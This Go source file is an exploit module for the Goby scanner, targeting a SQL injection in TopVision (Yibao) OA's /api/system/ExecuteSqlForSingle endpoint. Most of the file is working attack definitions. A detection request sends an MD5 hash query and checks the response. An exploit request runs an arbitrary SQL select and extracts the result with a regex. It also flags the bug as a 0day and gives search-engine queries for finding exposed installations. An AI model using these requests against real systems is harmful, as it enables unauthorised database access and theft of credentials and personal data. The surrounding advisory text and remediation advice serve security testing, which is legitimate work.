package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TopVision OA ExecuteSqlForSingle SQL Injection",
    "Description": "<p>TopVision OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also everyone can record important matters here, and the software also has a better check-in The system allows users to quickly record their work hours, and it will be easier to adjust shifts and make up cards, so that your work activity will be improved. This product has a SQL injection vulnerability, which can be used to obtain database permissions.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2022-12-03",
    "Author": "1angx",
    "FofaQuery": "title=\"欢迎登录易宝OA系统\"|| banner=\"易宝OA\"",
    "GobyQuery": "title=\"欢迎登录易宝OA系统\"|| banner=\"易宝OA\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.its365.net\">http://www.its365.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "select",
            "value": "@@version,db_name(),user",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/system/ExecuteSqlForSingle",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)\n&strParameters="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "e10adc3949ba59abbe56e057f20f883e",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/system/ExecuteSqlForSingle",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "token=zxh&sql=select {{{sql}}}&strParameters="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|{\"data\":\"(?s)(.*)\",\"code\""
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "易宝OA  ExecuteSqlForSingle SQL注入漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。该产品存在SQL注入漏洞，可通过该漏洞获取数据库权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.its365.net/products.aspx\" rel=\"nofollow\">http://www.its365.net/products.aspx</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "TopVision OA ExecuteSqlForSingle SQL Injection",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>TopVision OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also everyone can record important matters here, and the software also has a better check-in The system allows users to quickly record their work hours, and it will be easier to adjust shifts and make up cards, so that your work activity will be improved. This product has a SQL injection vulnerability, which can be used to obtain database permissions.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.its365.net\" rel=\"nofollow\">http://www.its365.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}